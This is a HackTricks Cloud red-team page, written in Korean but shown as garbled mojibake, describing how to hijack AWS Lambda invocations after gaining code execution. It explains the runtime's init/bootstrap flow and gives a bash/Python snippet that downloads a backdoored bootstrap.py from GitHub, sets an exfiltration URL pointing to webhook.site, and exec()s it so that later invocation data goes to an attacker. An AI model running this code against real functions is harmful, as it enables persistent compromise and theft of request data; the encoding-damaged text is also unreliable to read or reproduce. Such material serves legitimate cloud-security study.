# AWS - Lambda ìš”ì²­ í›”ì¹˜ê¸°

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

## Lambda íë¦„

<figure><img src="../../../../.gitbook/assets/image (341).png" alt=""><figcaption><p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png">https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png</a></p></figcaption></figure>

1. **Slicer**ëŠ” ì»¨í…Œì´ë„ˆ ì™¸ë¶€ì˜ í”„ë¡œì„¸ìŠ¤ë¡œ, **init** í”„ë¡œì„¸ìŠ¤ì— **í˜¸ì¶œ**ì„ **ì „ì†¡**í•©ë‹ˆë‹¤.
2. init í”„ë¡œì„¸ìŠ¤ëŠ” í¬íŠ¸ **9001**ì—ì„œ ëª‡ ê°€ì§€ í¥ë¯¸ë¡œìš´ ì—”ë“œí¬ì¸íŠ¸ë¥¼ ë…¸ì¶œí•©ë‹ˆë‹¤:
* **`/2018-06-01/runtime/invocation/next`** â€“ ë‹¤ìŒ í˜¸ì¶œ ì´ë²¤íŠ¸ ê°€ì ¸ì˜¤ê¸°
* **`/2018-06-01/runtime/invocation/{invoke-id}/response`** â€“ í˜¸ì¶œì— ëŒ€í•œ í•¸ë“¤ëŸ¬ ì‘ë‹µ ë°˜í™˜
* **`/2018-06-01/runtime/invocation/{invoke-id}/error`** â€“ ì‹¤í–‰ ì˜¤ë¥˜ ë°˜í™˜
3. **bootstrap.py**ëŠ” init í”„ë¡œì„¸ìŠ¤ì—ì„œ í˜¸ì¶œì„ ê°€ì ¸ì˜¤ëŠ” ë£¨í”„ë¥¼ ê°€ì§€ê³  ìˆìœ¼ë©°, ì´ë¥¼ ì²˜ë¦¬í•˜ê¸° ìœ„í•´ ì‚¬ìš©ì ì½”ë“œë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤ (**`/next`**).
4. ë§ˆì§€ë§‰ìœ¼ë¡œ, **bootstrap.py**ëŠ” initì— **ì‘ë‹µ**ì„ ì „ì†¡í•©ë‹ˆë‹¤.

bootstrapì€ ì‚¬ìš©ì ì½”ë“œë¥¼ ëª¨ë“ˆë¡œ ë¡œë“œí•˜ë¯€ë¡œ, ì‚¬ìš©ì ì½”ë“œì— ì˜í•´ ìˆ˜í–‰ëœ ëª¨ë“  ì½”ë“œ ì‹¤í–‰ì€ ì‹¤ì œë¡œ ì´ í”„ë¡œì„¸ìŠ¤ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤.

## Lambda ìš”ì²­ í›”ì¹˜ê¸°

ì´ ê³µê²©ì˜ ëª©í‘œëŠ” ì‚¬ìš©ìì˜ ì½”ë“œê°€ ì·¨ì•½í•œ ìš”ì²­ì„ ì²˜ë¦¬í•˜ëŠ” **`bootstrap.py`** í”„ë¡œì„¸ìŠ¤ ë‚´ì—ì„œ ì•…ì„± **`bootstrap.py`** í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰í•˜ë„ë¡ ë§Œë“œëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ **ì•…ì„± bootstrap** í”„ë¡œì„¸ìŠ¤ê°€ ìš”ì²­ì„ ì²˜ë¦¬í•˜ê¸° ìœ„í•´ **init í”„ë¡œì„¸ìŠ¤ì™€ í†µì‹ **ì„ ì‹œì‘í•˜ê³ , **ì •ìƒ** bootstrapì€ **ì•…ì„±** í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰ ì¤‘ì— **ê°‡íˆê²Œ** ë˜ì–´ init í”„ë¡œì„¸ìŠ¤ì— ìš”ì²­ì„ ìš”ì²­í•˜ì§€ ì•Šê²Œ ë©ë‹ˆë‹¤.

ì‚¬ìš©ìì˜ ì½”ë“œê°€ ì •ìƒ **`bootstrap.py`** í”„ë¡œì„¸ìŠ¤ì— ì˜í•´ ì‹¤í–‰ë˜ê³  ìˆê¸° ë•Œë¬¸ì— ì´ëŠ” ê°„ë‹¨í•œ ì‘ì—…ì…ë‹ˆë‹¤. ë”°ë¼ì„œ ê³µê²©ìëŠ” ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **í˜„ì¬ í˜¸ì¶œì˜ ê°€ì§œ ê²°ê³¼ë¥¼ init í”„ë¡œì„¸ìŠ¤ì— ì „ì†¡í•˜ì—¬**, initì´ bootstrap í”„ë¡œì„¸ìŠ¤ê°€ ë” ë§ì€ í˜¸ì¶œì„ ê¸°ë‹¤ë¦¬ê³  ìˆë‹¤ê³  ìƒê°í•˜ê²Œ ë§Œë“­ë‹ˆë‹¤.
* **`/${invoke-id}/response`**ì— ìš”ì²­ì„ ì „ì†¡í•´ì•¼ í•©ë‹ˆë‹¤.
* invoke-idëŠ” [**inspect**](https://docs.python.org/3/library/inspect.html) íŒŒì´ì¬ ëª¨ë“ˆì„ ì‚¬ìš©í•˜ì—¬ ì •ìƒ **`bootstrap.py`** í”„ë¡œì„¸ìŠ¤ì˜ ìŠ¤íƒì—ì„œ ì–»ê±°ë‚˜, **`/2018-06-01/runtime/invocation/next`**ì— ë‹¤ì‹œ ìš”ì²­í•˜ì—¬ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ë‹¤ìŒ í˜¸ì¶œì„ ì²˜ë¦¬í•  ì•…ì„± **`boostrap.py`**ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.
* ì€ë°€í•¨ì„ ìœ„í•´ lambda í˜¸ì¶œ ë§¤ê°œë³€ìˆ˜ë¥¼ ê³µê²©ìê°€ ì œì–´í•˜ëŠ” C2ë¡œ ì „ì†¡í•œ í›„ ìš”ì²­ì„ í‰ì†Œì²˜ëŸ¼ ì²˜ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ì´ ê³µê²©ì„ ìœ„í•´ì„œëŠ” ì‹œìŠ¤í…œì—ì„œ **`bootstrap.py`**ì˜ ì›ë³¸ ì½”ë“œë¥¼ ê°€ì ¸ì˜¤ê±°ë‚˜ [**github**](https://github.com/aws/aws-lambda-python-runtime-interface-client/blob/main/awslambdaric/bootstrap.py)ì—ì„œ ê°€ì ¸ì™€ ì•…ì„± ì½”ë“œë¥¼ ì¶”ê°€í•˜ê³  í˜„ì¬ lambda í˜¸ì¶œì—ì„œ ì‹¤í–‰í•˜ë©´ ì¶©ë¶„í•©ë‹ˆë‹¤.

### ê³µê²© ë‹¨ê³„

1. **RCE** ì·¨ì•½ì  ì°¾ê¸°.
2. **ì•…ì„±** **bootstrap** ìƒì„±í•˜ê¸° (ì˜ˆ: [https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py](https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py))
3. **ì•…ì„± bootstrap ì‹¤í–‰í•˜ê¸°.**

ì´ ì‘ì—…ì„ ìˆ˜í–‰í•˜ë ¤ë©´ ë‹¤ìŒì„ ì‹¤í–‰í•˜ë©´ ë©ë‹ˆë‹¤:
```bash
python3 <<EOF
import os
import urllib3

# Download backdoored bootstrap
http = urllib3.PoolManager()
backdoored_bootstrap_url = "https://raw.githubusercontent.com/carlospolop/lambda_bootstrap_switcher/main/backdoored_bootstrap.py"
new_runtime = http.request('GET', backdoored_bootstrap_url).data

# Load new bootstrap
os.environ['URL_EXFIL'] = "https://webhook.site/c7036f43-ce42-442f-99a6-8ab21402a7c0"

exec(new_runtime)
EOF
```
ë” ë§ì€ ì •ë³´ëŠ” [https://github.com/carlospolop/lambda\_bootstrap\_switcher](https://github.com/carlospolop/lambda\_bootstrap\_switcher)ë¥¼ í™•ì¸í•˜ì„¸ìš”.

## ì°¸ê³  ë¬¸í—Œ

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
